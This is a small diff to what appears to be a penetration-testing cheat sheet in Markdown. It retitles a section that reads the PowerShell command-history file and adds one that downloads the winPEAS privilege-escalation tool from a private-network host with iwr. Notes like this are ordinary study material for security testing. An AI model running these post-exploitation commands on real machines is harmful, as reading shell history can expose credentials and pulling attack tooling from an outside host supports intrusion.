@@ -1006,10 +1006,16 @@ Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.doc
 ~~~
 
 
-## PowerShell History
+## Get PowerShell History
 
 ~~~ powershell
 type (Get-PSReadLineOption).HistorySavePath
+~~~
+
+## Invoke Web Request(File download)
+
+~~~ powershell
+iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
 ~~~
 
 
